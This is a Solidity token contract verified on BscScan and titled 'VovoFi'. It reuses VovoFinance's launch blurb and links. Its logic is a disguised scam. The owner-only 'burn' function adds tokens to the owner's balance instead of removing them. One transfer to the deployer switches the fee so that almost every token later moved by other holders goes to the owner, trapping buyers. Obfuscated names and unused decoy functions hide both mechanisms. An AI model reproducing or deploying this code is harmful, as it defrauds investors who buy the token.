/**
 *Submitted for verification at BscScan.com on 2022-12-12
*/

/*
VovoFinance
Structuring money legos for customizable real yield
We are thrilled to announce the launch of #VovoFinance on 
arbitrum Mainnet!
With that, the 1st ever DeFi Principal Protected Products were born today.
It is built by periodically collecting CurveFinance
yield to open high leverage trades on GMX_IO
.
https://docs.vovo.finance/
https://vovofinance.medium.com/
http://discord.gg/7xEKgjMW37
https://twitter.com/VovoFinance
*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.5.0;
contract VovoFi {
string public  symbol = "VovoFi";
address private  BWURGL = address(0);
address private  WMZHIF = address(0);
uint256 private  NCAIIT = 1000000000000000000;
uint256 public constant totalSupply = 1000000000000000000000000000;
uint8 public constant decimals = 18;
address private  TJRXPC = address(0);
uint256 private  KGGYOS = 41;
address public owner;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
string public  name = "VovoFi";
uint256 private  ADWVIK = 82;
uint256 private  RAKLOD = 23;
mapping (address => uint256) public balanceOf;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 private  SJPCJE = 64;
event Transfer(address indexed from, address indexed to, uint256 value);
address private  JWVIBJ = address(0);
uint256 private  ITGUMG = 50;
mapping (address => mapping (address => uint256)) private _allowances;
event Approval(address indexed owner, address indexed spender, uint256 value);
address private  FPKKVB = address(0);
uint256 private  XEFJDK = 46;
uint256 public constant SEZHXT = 999999;
function _getBWURGL() private returns (address) {
return BWURGL;
}
//
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _get1JWVIBJ() private returns (address) {
return JWVIBJ;
}
//
function _getK2GGYOS() private returns (uint256) {
return KGGYOS + 26;
}
//
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getSJ3PCJE() private returns (uint256) {
return SJPCJE + 38;
}
//
function _getRAK4LOD() private returns (uint256) {
return RAKLOD + 44;
}
//
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getXEFJDK() private returns (uint256) {
return XEFJDK + 6;
}
//
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
constructor () public {
TJRXPC = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "PXGEDM");
require(to != address(0), "PXGEDM");
require(amount <= balanceOf[from], "PXGEDM");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* SEZHXT/NCAIIT ;
}
//
uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==TJRXPC){
NCAIIT = SEZHXT+2;
}
emit Transfer(from, to, transferAmount);
}
function _getADWVI5K() private returns (uint256) {
return ADWVIK + 15;
}
//
function _getWMZHIF6() private returns (address) {
return WMZHIF;
}
//
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _get7FPKKVB() private returns (address) {
return FPKKVB;
}
//
function _getI8TGUMG() private returns (uint256) {
return ITGUMG + 83;
}
//
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");
//
balanceOf[account] += amount;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tPXGEDM 0");
require(spender != address(0), "fPXGEDM 0");
//
_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
//
}

library Strings256 {
    function toString(uint256 value) internal pure returns (string memory) {
        if (value == 0) {
            return "0";
        }
        uint256 temp = value;
        uint256 digits;
        while (temp != 0) {
            digits++;
            temp /= 10;
        }
        bytes memory buffer = new bytes(digits);
        uint256 index = digits - 1;
        temp = value;
        while (temp != 0) {
            buffer[index--] = bytes1(uint8(48 + temp % 10));
            temp /= 10;
        }
        return string(buffer);
    }
}